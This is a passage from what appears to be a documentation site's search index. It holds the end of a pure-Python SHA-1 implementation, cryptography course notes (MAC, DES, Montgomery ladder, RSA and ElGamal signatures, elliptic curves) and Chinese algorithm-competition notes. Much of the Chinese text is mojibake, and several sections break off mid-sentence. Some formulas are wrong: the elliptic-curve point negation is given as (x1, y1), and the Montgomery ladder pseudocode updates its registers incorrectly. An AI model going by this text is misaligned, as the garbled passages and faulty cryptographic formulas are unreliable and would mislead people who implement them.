0xffffffff   def _process_chunk(chunk, h0, h1, h2, h3, h4):  \u0026#34;\u0026#34;\u0026#34;Process a chunk of data and return the new digest variables.\u0026#34;\u0026#34;\u0026#34;  assert len(chunk) == 64   w = [0] * 80   # Break chunk into sixteen 4-byte big-endian words w[i]  for i in range(16):  w[i] = struct.unpack(b\u0026#39;\u0026gt;I\u0026#39;, chunk[i * 4:i * 4 + 4])[0]   # Extend the sixteen 4-byte words into eighty 4-byte words  for i in range(16, 80):  w[i] = _left_rotate(w[i - 3] ^ w[i - 8] ^ w[i - 14] ^ w[i - 16], 1)   # Initialize hash value for this chunk  a = h0  b = h1  c = h2  d = h3  e = h4   for i in range(80):  if 0 \u0026lt;= i \u0026lt;= 19:  # Use alternative 1 for f from FIPS PB 180-1 to avoid bitwise not  f = d ^ (b \u0026amp; (c ^ d))  k = 0x5A827999  elif 20 \u0026lt;= i \u0026lt;= 39:  f = b ^ c ^ d  k = 0x6ED9EBA1  elif 40 \u0026lt;= i \u0026lt;= 59:  f = (b \u0026amp; c) | (b \u0026amp; d) | (c \u0026amp; d)  k = 0x8F1BBCDC  elif 60 \u0026lt;= i \u0026lt;= 79:  f = b ^ c ^ d  k = 0xCA62C1D6   a, b, c, d, e = ((_left_rotate(a, 5) + f + e + k + w[i]) \u0026amp; 0xffffffff,  a, _left_rotate(b, 30), c, d)   # Add this chunk\u0026#39;s hash to result so far  h0 = (h0 + a) \u0026amp; 0xffffffff  h1 = (h1 + b) \u0026amp; 0xffffffff  h2 = (h2 + c) \u0026amp; 0xffffffff  h3 = (h3 + d) \u0026amp; 0xffffffff  h4 = (h4 + e) \u0026amp; 0xffffffff   return h0, h1, h2, h3, h4   class Sha1Hash(object):  \u0026#34;\u0026#34;\u0026#34;A class that mimics that hashlib api and implements the SHA-1 algorithm.\u0026#34;\u0026#34;\u0026#34;   name = \u0026#39;python-sha1\u0026#39;  digest_size = 20  block_size = 64   def __init__(self):  # Initial digest variables  self._h = (  0x67452301,  0xEFCDAB89,  0x98BADCFE,  0x10325476,  0xC3D2E1F0,  )   # bytes object with 0 \u0026lt;= len \u0026lt; 64 used to store the end of the message  # if the message length is not congruent to 64  self._unprocessed = b\u0026#39;\u0026#39;  # Length in bytes of all data that has been processed so far  self._message_byte_length = 0   def update(self, arg):  \u0026#34;\u0026#34;\u0026#34;Update the current digest. This may be called repeatedly, even after calling digest or hexdigest. Arguments: arg: bytes, bytearray, or BytesIO object to read from. \u0026#34;\u0026#34;\u0026#34;  if isinstance(arg, (bytes, bytearray)):  arg = io.BytesIO(arg)   # Try to build a chunk out of the unprocessed data, if any  chunk = self._unprocessed + arg.read(64 - len(self._unprocessed))   # Read the rest of the data, 64 bytes at a time  while len(chunk) == 64:  self._h = _process_chunk(chunk, *self._h)  self._message_byte_length += 64  chunk = arg.read(64)   self._unprocessed = chunk  return self   def digest(self):  \u0026#34;\u0026#34;\u0026#34;Produce the final hash value (big-endian) as a bytes object\u0026#34;\u0026#34;\u0026#34;  return b\u0026#39;\u0026#39;.join(struct.pack(b\u0026#39;\u0026gt;I\u0026#39;, h) for h in self._produce_digest())   def hexdigest(self):  \u0026#34;\u0026#34;\u0026#34;Produce the final hash value (big-endian) as a hex string\u0026#34;\u0026#34;\u0026#34;  return \u0026#39;%08x%08x%08x%08x%08x\u0026#39; % self._produce_digest()   def _produce_digest(self):  \u0026#34;\u0026#34;\u0026#34;Return finalized digest variables for the data processed so far.\u0026#34;\u0026#34;\u0026#34;  # Pre-processing:  message = self._unprocessed  message_byte_length = self._message_byte_length + len(message)   # append the bit \u0026#39;1\u0026#39; to the message  message += b\u0026#39;\\x80\u0026#39;   # append 0 \u0026lt;= k \u0026lt; 512 bits \u0026#39;0\u0026#39;, so that the resulting message length (in bytes)  # is congruent to 56 (mod 64)  message += b\u0026#39;\\x00\u0026#39; * ((56 - (message_byte_length + 1) % 64) % 64)   # append length of message (before pre-processing), in bits, as 64-bit big-endian integer  message_bit_length = message_byte_length * 8  message += struct.pack(b\u0026#39;\u0026gt;Q\u0026#39;, message_bit_length)   # Process the final chunk  # At this point, the length of the message is either 64 or 128 bytes.  h = _process_chunk(message[:64], *self._h)  if len(message) == 64:  return h  return _process_chunk(message[64:], *h)   def sha1(data):  \u0026#34;\u0026#34;\u0026#34;SHA-1 Hashing Function A custom SHA-1 hashing function implemented entirely in Python. Arguments: data: A bytes or BytesIO object containing the input message to hash. Returns: A hex SHA-1 digest of the input message. \u0026#34;\u0026#34;\u0026#34;  return Sha1Hash().update(data).hexdigest()   if __name__ == \u0026#39;__main__\u0026#39;:  # Imports required for command line parsing. No need for these elsewhere  import argparse  import sys  import os   # Parse the incoming arguments  parser = argparse.ArgumentParser()  parser.add_argument(\u0026#39;input\u0026#39;, nargs=\u0026#39;*\u0026#39;,  help=\u0026#39;input file or message to hash\u0026#39;)  args = parser.parse_args()   data = None  if len(args.input) == 0:  # No argument given, assume message comes from standard input  try:  # sys.stdin is opened in text mode, which can change line endings,  # leading to incorrect results. Detach fixes this issue, but it\u0026#39;s  # new in Python 3.1  data = sys.stdin.detach()   except AttributeError:  # Linux ans OSX both use \\n line endings, so only windows is a  # problem.  if sys.platform == \u0026#34;win32\u0026#34;:  import msvcrt   msvcrt.setmode(sys.stdin.fileno(), os.O_BINARY)  data = sys.stdin   # Output to console  print(\u0026#39;sha1-digest:\u0026#39;, sha1(data))   else:  # Loop through arguments list  for argument in args.input:  if (os.path.isfile(argument)):  # An argument is given and it\u0026#39;s a valid file. Read it  data = open(argument, \u0026#39;rb\u0026#39;)   # Show the final digest  print(\u0026#39;sha1-digest:\u0026#39;, sha1(data))  else:  print(\u0026#34;Error, could not find \u0026#34; + argument + \u0026#34; file.\u0026#34; ) "},{"id":353,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%AE%97%E6%B3%95%E5%92%8C%E5%8D%8F%E8%AE%AE%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/4.block-hash-mac/4.3.mac/","title":"4.3. MAC","section":"4.Block-Hash-MAC","content":"MAC #  Overview #  MAC is used for providing authenticity of a user or source originality.\nMethod for generating MAC:\n Pseudo-random sequence generators (or stream cipher). Block ciphers through CBC mode. Keyed hash functions.  "},{"id":354,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%AE%97%E6%B3%95%E5%92%8C%E5%8D%8F%E8%AE%AE%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/4.block_hash_mac/","title":"4. Block Hash MAC","section":"ç®—æ³•å’Œåè®®ä¸­çš„å®‰å…¨æœºåˆ¶","content":"Chapter 4. Design of Block Ciphers, Hash Functions, and MAC #  Block Cipher #  DES #  DES stand for Data Encryption Standard.\nSpectral properties of S-Box:\n Hadamard transform: $$\\displaystyle f(w) = \\sum_{x \\in F_2^n} (-1)^{f(x) + xw}$$ Avalanche transform: $$\\displaystyle A(w) = \\sum_{x \\in F_2^n} (-1)^{f(x) + f(x + w)}$$  Triple-DES: $$C = E_{K_3} (D_{K_2} (E_{K_1}(M)))$$ or $$C = D_{K_3} (E_{K_2} (D_{K_1}(M)))$$\nEncryption Modes:\n Electronic Codebook (ECB) Mode =\u0026gt; Security risks. Cipher Block Chaining (CBC) Mode.  Montgomery Ladder #  A compute algorithm that resist side-chanel attack.\nfunction f(g, k):\r// g=\u0026gt;number, k=\u0026gt;(k[t-1], ..., k[0])_2\rR0, R1 = 1, g\rfor j in range(t)[::-1]:\rif k[j] == 0:\rR1 = R0*R1, R0 = R0*R0\relse if k[j] == 1:\rR0 = R0*R1, R1 = R0*R0\relse:\rassert False\rreturn R0 AES #  Stream Cipher \u0026amp; Block Cipher #  Block Cipher: more computationally costly.\nStream Cipher: More desired randomness properties.\nHash Functions #  Why Hash?\n Save Storage Efficient Additional information for integrity check  Hash Standards:\n MD5, Rivest SHA-1 SHA-2 SHA-3 Kecchak  SHA-1 #  IBC(Identity-Based Cryptography) #  Extract:\nThe public key $$Q_i \\in \\mathbb{G}_1^*$$ of node i with identity $$ID_i$$ is as $$Q_i = H_1(ID_i)$$, where ID is an arbitrarily long binary string. The KGC derive\nEncryption \u0026amp; Decryption:\nEncryption:\n  When a user is transmitting a message m to user i confidentially, he encrypts m using user i\u0026rsquo;s public key and the system parameter in the following way: $$Encrypte(m) \\rightarrow C$$\n  When C is computed by:\n Randomly choose $$\\sigma \\in {0, 1}^*$$, and compute $$r =$$    "},{"id":355,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%AE%97%E6%B3%95%E5%92%8C%E5%8D%8F%E8%AE%AE%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/5.publickey/","title":"5. Public Key","section":"ç®—æ³•å’Œåè®®ä¸­çš„å®‰å…¨æœºåˆ¶","content":"Chapter 5. Public-Key Cryptographic Algorithms #  Security is based on the difficulty of some computational hard problems: factorization large integer, discrete algorithm.\nDiffie-Hellman Key Exchange #  ç”¨äºåœ¨ä¸¤ä¸ªç»ˆç«¯ä¹‹é—´å…±äº«ä¸€ä¸ªç§å¯†çš„æ•°å­—ï¼š\næ­¤æ—¶ä¸¤ä¸ªç»ˆç«¯ç›´æ¥å°±å…±äº«äº†ä¸€ä¸ªç§å¯†ä¿¡æ¯ï¼š$$\\displaystyle g^{X_A X_B}\\pmod{p}$$\nRSA #  RSA encrypt algorithm #  RSA digital signature algorithm (RSA-DSA) #  Signed message m:\n  Compute: $$H(m)$$ and $$r = (H(m))^d \\pmod{n}$$\n  r is the digital signature of message m\n  Verify the digital signature r:\n  Compute $$H(m)$$ and $$s = r^e \\pmod{n}$$\n  Check if $$H(m) = s$$\n  ElGamal digital signature #  Digital signature algorithm (ElGamal-DSA) #  åœ¨çº¿æ–‡æ¡£ï¼šElGamal\nè§ä¿¡æ¯å®‰å…¨æ•°å­¦åŸºç¡€ä¸­æœé›†çš„æ•™ç¨‹ï¼šElGamal\nHow to attack ElGamal DSA? #  ElGamal DSA is much more complicated than RSA-DSA:\n Forgery if DL is easy. Simply solve y from x using $$y = g^x \\pmod{p}$$ Forgery from attacking PRNG. Forgery from attacking hash function. Directly solve the signing equation: $$H(m) = xr + ks \\pmod{p - 1}$$  Digital signature standard (ElGamal DSS) #  NIST, authentication of electronic documents.\nElliptic curve crypto-system #  Elliptic curve over finite field #  è®¾ $$\\Z_p$$ ä¸ºç‰¹å¾å¤§äº 3 çš„ç´ åŸŸï¼Œåœ¨å¯†ç å­¦å®è·µä¸­ï¼Œå°† $$E(\\Z_p)$$ ä¸Šçš„ weierstrass æ–¹ç¨‹å®šä¹‰ä¸ºï¼š\n $$y^2 = x^3 +ax +b$$ æˆ–è€…è®°åš $$y^2 \\equiv x^3 +ax +b \\pmod{p}$$  æ ¹æ®å¯¹ Weierstrass æ–¹ç¨‹çš„ç ”ç©¶ï¼Œå¯ä»¥å¯¼å‡ºè¿™ä¸ªæ¤­åœ†æ›²çº¿ä¸Šçš„è´Ÿå…ƒå…¬å¼å’ŒåŠ æ³•å…¬å¼ï¼š\n è®¾ $$P_1 = (x_1, y_1), P_2 = (x_2, y_2)$$ æ˜¯ $$E(\\Z_p)$$ ä¸Šå¼‚äºæ— ç©·è¿œç‚¹ O çš„ä¸¤ä¸ªç‚¹ã€‚åˆ™ï¼š è´Ÿå…ƒå…¬å¼ï¼š$$-P_1 = (x_1, y_1)$$ åŠ æ³•å…¬å¼ï¼šè€ƒè™‘ $$P_3 = (x_3, y_3) = P_1 + P_2$$ï¼š  å¯å¾— $$\\begin{cases} x_3 = k^2 -x_1 - x_2 \\ y_3 = k(x_1 - x_3) - y_1\\end{cases}$$ å…¶ä¸­ $$k = \\begin{cases}\\displaystyle \\frac{y_2 - y_1}{x_2 - x_1} \u0026amp; x_1 \\not= x_2 \\ \\displaystyle \\frac{3x_1^2 + a}{2y_1} \u0026amp; x_1 = x_2\\end{cases}$$    Elliptic curve digital signature algorithm (EC-DSA) #  Identity-Based Cryptography (IBC) #  "},{"id":356,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%AE%97%E6%B3%95%E5%92%8C%E5%8D%8F%E8%AE%AE%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/6.securityinfrastructure/","title":"6. Security Infrastructure","section":"ç®—æ³•å’Œåè®®ä¸­çš„å®‰å…¨æœºåˆ¶","content":"Chapter 6. Security Infrastructure #  "},{"id":357,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%AE%97%E6%B3%95%E5%92%8C%E5%8D%8F%E8%AE%AE%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/7.establishcommunication/","title":"7. Establish Communication","section":"ç®—æ³•å’Œåè®®ä¸­çš„å®‰å…¨æœºåˆ¶","content":"Chapter 7. Establish Protect Communications #  "},{"id":358,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B%E5%85%A5%E9%97%A8%E7%BB%8F%E5%85%B8/1.%E5%9F%BA%E7%A1%80%E9%A2%98%E7%9B%AE/","title":"1.åŸºç¡€é¢˜ç›®","section":"ç®—æ³•ç«èµ›å…¥é—¨ç»å…¸","content":"åŸºç¡€é¢˜ç›® #  æ•°å­¦ç›¸å…³ #   Cantor æ•°è¡¨ï¼šå°† Georg Cantor ç”¨äºè¯æ˜æœ‰ç†æ•°æ˜¯å¯ç©·ä¸¾çš„æ•°è¡¨ï¼Œæ‹Ÿåˆä¸ºä¸€ä¸ªåˆ—è¡¨ï¼ˆç¬¬ä¸€é¡¹æ˜¯ 1/1ï¼Œç¬¬äºŒé¡¹æ˜¯ 1/2ï¼Œæ¥ç€æ˜¯ 2/1ã€3/1ã€2/2ã€1/3\u0026hellip;ï¼‰ã€‚\næ±‚ Cantor æ•°è¡¨çš„ç¬¬ n é¡¹ã€‚\n ç¬¬ i æ¡çº¿ä¸Šæœ‰ i ä¸ªæ•°ã€‚\n æœå›­é‡Œçš„æ ‘ï¼šæ ‘æ’åˆ—æˆçŸ©é˜µï¼Œå®ƒä»¬çš„ x/y åæ ‡å‡æ˜¯ 1-99 çš„æ•´æ•°ã€‚è¾“å…¥è‹¥å¹²ä¸ªä¸‰è§’å½¢ï¼Œä¾æ¬¡ç»Ÿè®¡æ¯ä¸ªä¸‰è§’å½¢å†…éƒ¨å’Œè¾¹ç•Œä¸Šæ€»å…±æœ‰å¤šå°‘æ£µæ ‘ã€‚\n ä¸‰è§’å½¢çš„æœ‰å‘é¢ç§¯ï¼š$$\\begin{pmatrix} x_0 \u0026amp; y_0 \u0026amp; 1 \\ x_1 \u0026amp; y_1 \u0026amp; 1 \\ x_2 \u0026amp; y_2 \u0026amp; 1 \\end{pmatrix}$$\n å¤šå°‘å—åœŸåœ°ï¼šä½ æœ‰ä¸€å—æ¤­åœ†å½¢çš„åœ°ï¼Œåœ¨è¾¹ç•Œä¸Šé€‰å– n ä¸ªç‚¹ï¼Œä¸¤ä¸¤è¿æ¥å¾—åˆ° $$\\displaystyle \\frac{n(n-1)}{2}$$ æ¡çº¿æ®µï¼Œå®ƒä»¬æœ€å¤šèƒ½æŠŠåœŸåœ°åˆ†æˆå¤šå°‘ä¸ªéƒ¨åˆ†ã€‚\n æ¬§æ‹‰å…¬å¼ï¼šV - E + F = 2ï¼›\nå›¾ç›¸å…³ #   å²›å±¿é—®é¢˜\n DFS (Depth-First Search, DFS): æ·±åº¦ä¼˜å…ˆéå†ã€‚\n è¿·å®«é—®é¢˜\n BFS (Breadth-First Search): å¹¿åº¦ä¼˜å…ˆéå†ã€‚\nå¯ä»¥æ„é€ ä¸€ä¸ªä»¥èµ·ç‚¹ä¸ºæ ¹èŠ‚ç‚¹çš„æ ‘çŠ¶ç»“æ„ã€‚\n æ‹“æ‰‘æ’åº (topological sort)ï¼šå¯¹äº n ä¸ªå˜é‡ï¼Œm ä¸ªäºŒå…ƒç»„ (u, v) è¡¨ç¤º u \u0026lt; vï¼šæŠŠæ¯ä¸ªå˜é‡çœ‹æˆä¸€ä¸ªç‚¹ï¼Œæ¯ä¸ªäºŒå…ƒç»„çœ‹æˆä¸€æ¡æœ‰å‘è¾¹ï¼ŒæŠŠä¸€ä¸ªå›¾çš„æ‰€æœ‰èŠ‚ç‚¹è¿›è¡Œæ’åºï¼Œä½¿å¾—æœ‰å‘è¾¹çš„ u éƒ½åœ¨ v çš„å‰é¢ï¼Œè¿™ä¸ªè¿‡ç¨‹ç§°ä¸ºæ‹“æ‰‘æ’åºã€‚\n æœ‰å‘æ— ç¯å›¾ (Directed Acyclic Graph, DAG)\n æ¬§æ‹‰å›è·¯\n æš´åŠ›æ³• #  å›æº¯æ³• #   å…«çš‡åé—®é¢˜\n å›æº¯æ³• (backtracking)ã€‚\n ç´ æ•°ç¯ï¼šè¾“å…¥æ­£æ•´æ•° nï¼ŒæŠŠ 1-n ç»„æˆä¸€ä¸ªç¯ï¼Œä½¿å¾—ä»»æ„ç›¸é‚»ä¸¤ä¸ªæ•°å­—çš„å’Œä¸ºç´ æ•°ã€‚\n éšå¼å›¾æœç´¢ #   åŸƒåŠåˆ†æ•°ï¼šåœ¨å¤åŸƒåŠï¼Œäººä»¬ä½¿ç”¨å•ä½åˆ†æ•°çš„å’Œè¡¨ç¤ºä¸€åˆ‡æœ‰ç†æ•°ã€‚ä¾‹å¦‚ï¼š2/3 = 1/2 + 1/6ï¼Œä½†æ˜¯ä¸å…è®¸ç›¸åŒçš„åŠ æ•°å‡ºç°ï¼Œæ¯”å¦‚ï¼š2/3 = 1/3 + 1/3ã€‚å¯¹äºä¸€ä¸ªåˆ†æ•° a/bï¼Œè¡¨ç¤ºæ–¹æ³•æœ‰å¾ˆå¤šç§ï¼Œå…¶ä¸­åŠ æ•°è¶Šå°‘è¶Šå¥½ï¼Œå¦‚æœåŠ æ•°ä¸ªæ•°ç›¸åŒåˆ™æœ€å¤§çš„åˆ†æ¯è¶Šå°è¶Šå¥½ã€‚\nç»™å®šä¸¤ä¸ªæ•´æ•° aã€bï¼Œæ±‚æœ€ä½³è¡¨è¾¾å¼ã€‚\n è¿­ä»£åŠ æ·±æœç´¢ (iterative deepening)ï¼šä»å°åˆ°å¤§æšä¸¾æ·±åº¦ä¸Šé™ dï¼Œæ¯æ¬¡åªè€ƒè™‘æ·±åº¦ä¸è¶…è¿‡ d çš„èŠ‚ç‚¹ã€‚\næ·±åº¦ä¸Šé™å¯¹äºè¿™ä¸ªé¢˜ç›®è¿˜å¯ä»¥ç”¨å‰ªæ (prune) çš„æ€æƒ³ï¼Œå¦‚æœæ‰©å±•åˆ° i å±‚ï¼Œå‰ i çš„åˆ†æ•°å’Œä¸º c/dï¼Œè€Œç¬¬ i ä¸ªåˆ†æ•°ä¸º 1/eï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥è¿˜éœ€è¦ (a/b-c/d)/(1/e) çš„åˆ†æ•°ã€‚\n å€’æ°´é—®é¢˜\n å‡è®¾æ¯ä¸ªæ°´æ¯ä¸­ç››æ”¾äº†ä¸€å®šé‡çš„æ°´ï¼Œè®¤ä¸ºæ˜¯ä¸€ç§çŠ¶æ€ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥æ„é€ å‡ºä¸€ä¸ªçŠ¶æ€è½¬ç§»æœ‰å‘å›¾ã€‚\n å…«æ•°ç é—®é¢˜ï¼šç¼–å·ä¸º 1-8 çš„ 8 ä¸ªæ­£æ–¹å½¢è¢«æ‘†æˆ 3 è¡Œ 3 åˆ—ã€‚æ¯æ¬¡æ“ä½œå¯ä»¥æŠŠä¸ç©ºæ ¼ç›¸é‚»çš„ä»»æ„æ»‘å—ç§»åŠ¨åˆ°ç©ºæ ¼ä¸­ï¼Œä½¿å¾—è¯¥æ»‘å—åŸæ¥çš„ä½ç½®æˆä¸ºæ–°çš„ç©ºæ ¼ã€‚\nå¦‚æœç»™å®šåˆå§‹å±€é¢å’Œç›®æ ‡å±€é¢ï¼Œè®¡ç®—å‡ºæœ€å°‘çš„ç§»åŠ¨æ­¥æ•°ã€‚\n æ¯ä¸ªçŠ¶æ€è®¤ä¸ºæ˜¯å›¾çš„ä¸€ä¸ªèŠ‚ç‚¹ï¼Œä¸Šè¿°é—®é¢˜å°±æ˜¯å›¾ä¸Šçš„æœ€çŸ­è·¯é—®é¢˜ã€‚\né«˜æ•ˆç®—æ³• #   æœ€å¤§è¿ç»­å’Œã€‚\n $O(n^3)$ ç®—æ³•ï¼šä¸‰å±‚å¾ªç¯ï¼›\n$O(n^2)$ ç®—æ³•ï¼šè®¾ $S_i$ ä¸ºå‰ i é¡¹å’Œï¼Œæ±‚è§£ $S_j - S_i$ çš„æœ€å¤§å€¼åªéœ€è¦ä¸¤å±‚å¾ªç¯ï¼›\n$O(n log n)$ ç®—æ³•ï¼šåˆ†æ²»ç­–ç•¥ï¼Œå‰ä¸€åŠçš„æœ€å¤§ã€åä¸€åŠçš„æœ€å¤§ï¼Œèµ·ç‚¹åœ¨å‰é¢ç»ˆç‚¹åœ¨åé¢çš„æœ€å¤§ï¼›\n$O(n)$ ç®—æ³•ï¼šè¿­ä»£å¼è®¡ç®—ä»¥ n ç»“å°¾çš„æœ€å¤§è¿ç»­å’Œã€‚\n å¾ªç¯æ—¥ç¨‹è¡¨é—®é¢˜\n é€’å½’ã€‚\nè´ªå¿ƒç®—æ³• #   æœ€ä¼˜è£…è½½é—®é¢˜ï¼šç»™å®š n ä¸ªç‰©å“çš„é‡é‡ï¼Œé€‰æ‹©å°½é‡å¤šçš„ç‰©ä½“ä½¿å¾—æ€»é‡é‡ä¸è¶…è¿‡ Cã€‚\n ä¼˜å…ˆè£…è½½è¾ƒè½»çš„ç‰©å“ã€‚\n éƒ¨åˆ†èƒŒåŒ…é—®é¢˜ï¼šç»™å®š n ä¸ªç‰©å“çš„é‡é‡å’Œä»·å€¼ï¼Œåœ¨æ€»é‡é‡ä¸è¶…è¿‡ C çš„æƒ…å†µä¸‹ä½¿å¾—æ€»ä»·æœ€é«˜ã€‚æ¯ä¸ªç‰©å“å¯ä»¥åªå–èµ°ä¸€éƒ¨åˆ†ï¼Œä»·å€¼æŒ‰æ¯”ä¾‹è®¡ç®—ã€‚\n ä¼˜å…ˆå– â€œä»·å€¼/é‡é‡â€ æœ€å¤§çš„ã€‚\n ä¹˜èˆ¹é—®é¢˜ï¼šç»™å®š n ä¸ªäººçš„é‡é‡ï¼Œæ¯è‰˜èˆ¹æ‰¿é‡ Cï¼Œä¸”æœ€å¤šåªèƒ½ä¹˜ä¸¤ä¸ªäººã€‚ç”¨æœ€å°‘çš„èˆ¹è£…è½½æ‰€æœ‰äººã€‚\n ä»æœ€è½»çš„äººå¼€å§‹ï¼Œé€‰æ‹©èƒ½è·Ÿä»–ä¸€èµ·ä¹˜åçš„äººä¸­ï¼Œæœ€é‡çš„äººä¸€èµ·ä¹˜èˆ¹ã€‚\n é€‰æ‹©ä¸ç›¸äº¤åŒºé—´ï¼šç»™å®š n ä¸ªå¼€åŒºé—´ï¼Œé€‰æ‹©å°½é‡å¤šçš„åŒºé—´ä½¿å¾—ä¸¤ä¸¤ä¹‹é—´æ²¡æœ‰å…¬å…±ç‚¹ã€‚\n æŒ‰ä¸Šé™æ’åºï¼Œä»å°åˆ°å¤§é€‰æ‹©ã€‚\n åŒºé—´é€‰ç‚¹é—®é¢˜ï¼šç»™å®š n ä¸ªé—­åŒºé—´ï¼Œå–å°½é‡å°‘çš„ç‚¹ä½¿å¾—æ¯ä¸ªåŒºé—´ä¸­è‡³å°‘æœ‰ä¸€ä¸ªç‚¹ã€‚\n æŒ‰ä¸Šé™æ’åºï¼Œç›´æ¥é€‰æ‹©åŒºé—´çš„ä¸Šé™ã€‚\n åŒºé—´è¦†ç›–é—®é¢˜ï¼šç»™å®š n ç»™é—­åŒºé—´ï¼Œé€‰æ‹©å°½é‡å°‘çš„é—­åŒºé—´å®Œå…¨è¦†ç›–ç»™å®šçº¿æ®µï¼›\n "},{"id":359,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B%E5%85%A5%E9%97%A8%E7%BB%8F%E5%85%B8/2.%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%E5%88%9D%E6%AD%A5/","title":"2.åŠ¨æ€è§„åˆ’åˆæ­¥","section":"ç®—æ³•ç«èµ›å…¥é—¨ç»å…¸","content":"åŠ¨æ€è§„åˆ’åˆæ­¥ #  é—®é¢˜ï¼šæ•°å­—ä¸‰è§’å½¢ #   æœ‰ä¸€ä¸ªç”±éè´Ÿæ•´æ•°ç»„æˆçš„ä¸‰è§’å½¢ï¼Œç¬¬ä¸€è¡Œåªæœ‰ä¸€ä¸ªæ•°å­—ï¼Œå‡ºäº†æœ€ä¸‹é¢ä¸€è¡Œä¹‹å¤–çš„æ¯ä¸€ä¸ªæ•°å­—çš„å·¦ä¸‹æ–¹å’Œå³ä¸‹æ–¹éƒ½æœ‰ä¸€ä¸ªæ•°å­—ã€‚\nå¦‚æœä»ç¬¬ä¸€è¡Œå¼€å§‹ï¼Œæ¯æ¬¡å¯ä»¥å‘å·¦ä¸‹æˆ–å³ä¸‹èµ°ä¸€æ ¼ï¼Œæ€æ ·çš„èµ°æ³•èƒ½ä½¿è·¯å¾„èŠ‚ç‚¹å’Œæœ€å¤§ã€‚\n å¦‚æœæˆ‘ä»¬æŠŠæ¯ä¸ªæ ¼å­æŒ‰ç…§è¡Œåˆ—ç¼–å·ï¼Œç„¶åå®šä¹‰ d(i, j) ä¸ºä»æ ¼å­ (i, j) å‡ºå‘æ—¶èƒ½å¾—åˆ°çš„æœ€å¤§å’Œï¼Œäºæ˜¯åŸé—®é¢˜å³æ±‚è§£ d(1, 1)ï¼Œå¯ä»¥å¾—åˆ°çŠ¶æ€è½¬ç§»æ–¹ç¨‹ï¼š\n $d(i, j) = a(i, j) + max(d(i+1, j), d(i+1, j+1))$  æœ€ä¼˜å­ç»“æ„ï¼ˆoptimal substructureï¼‰ï¼šå…¨å±€æœ€ä¼˜è§£åŒ…å«å±€éƒ¨æœ€ä¼˜è§£ï¼Œå¦‚æœå±€éƒ¨ä¸æ˜¯æœ€ä¼˜çš„ï¼Œé‚£ä¹ˆå…¨å±€è‚¯å®šä¸æ˜¯æœ€ä¼˜çš„ã€‚\né™¤äº†åŠ¨æ€è§„åˆ’ä¹‹å¤–ï¼Œè¿™ä¸ªé—®é¢˜è¿˜å¯ä»¥ä½¿ç”¨è®°å¿†åŒ– (memoization) çš„æ€æƒ³ã€‚\nDAG ä¸Šçš„åŠ¨æ€è§„åˆ’ #  æœ€é•¿è·¯å¾„é—®é¢˜ #   åµŒå¥—çŸ©å½¢ï¼šæœ‰ n ä¸ªé•¿å®½åˆ†åˆ«ä¸º $(a_i, b_i)$ çš„çŸ©å½¢ï¼Œå¦‚æœå¯¹äºä¸¤ä¸ªçŸ©å½¢ X(a, b), Y(c, d)ï¼Œå¦‚æœ a\u0026lt;c, b\u0026lt;d æˆ–è€… a\u0026lt;d, b\u0026lt;cï¼Œé‚£ä¹ˆæˆ‘ä»¬ç§° X å¯ä»¥è¢« Y åµŒå¥—ã€‚\nç»™å®šä»»æ„å¤šçš„çŸ©å½¢ï¼Œæ±‚æœ€é•¿çš„åµŒå¥—åºåˆ—ï¼Œä½¿å¾—åºåˆ—ä¸­çš„æ¯ä¸ªçŸ©å½¢éƒ½èƒ½åµŒå¥—åœ¨åä¸€ä¸ªä¸­ã€‚\n è¿™ä¸ªé—®é¢˜ä¸­çš„â€œåµŒå¥—â€å°±æ˜¯ä¸€ä¸ªå…¸å‹çš„äºŒå…ƒå…³ç³»ï¼Œå¯ä»¥ DAG æ¥å»ºæ¨¡ã€‚\nåœ¨è¿™æ ·ä¸€ä¸ªåµŒå¥—å…³ç³»çš„ DAG ä¸­ï¼Œå¦‚æœè®¾ d(i) è¡¨ç¤ºä»èŠ‚ç‚¹ i å‡ºå‘çš„æœ€é•¿è·¯é•¿åº¦ï¼Œè¾¹çš„é›†åˆè®¾ä¸º Eï¼Œé‚£ä¹ˆå¯ä»¥å¾—åˆ°æœ‰çŠ¶æ€è½¬ç§»æ–¹ç¨‹ï¼š\n $d(i) = max{d(j) + 1 | (i, j) \\in E}$  å‡è®¾ E å­˜å‚¨åœ¨é‚»æ¥çŸ©é˜µ G ä¸­ï¼Œå¦‚æœæˆ‘ä»¬å¾—åˆ°äº† Gï¼Œé‚£ä¹ˆå¯ä»¥ç”¨è®°å¿†åŒ–æœç´¢è§£å†³ d çš„å€¼ï¼š\nint dp(int i) {  int\u0026amp; ans = d[i];  if (ans \u0026gt; 0) return ans;  for (int j = i; j \u0026lt;= n; j++) if (G[i][j]) ans \u0026gt;?= dp(j) + 1;  return ans; } å›ºå®šç»ˆç‚¹çš„æœ€é•¿æœ€çŸ­è·¯å¾„ #   ç¡¬å¸é—®é¢˜ï¼šæœ‰ n ä¸­ç¡¬å¸ï¼Œé¢å€¼åˆ†åˆ«ä¸º $V_1, V_2, \\cdots, V_n$ï¼Œæ¯ç§éƒ½æœ‰æ— é™å¤šã€‚ç»™å®šéè´Ÿæ•´æ•° 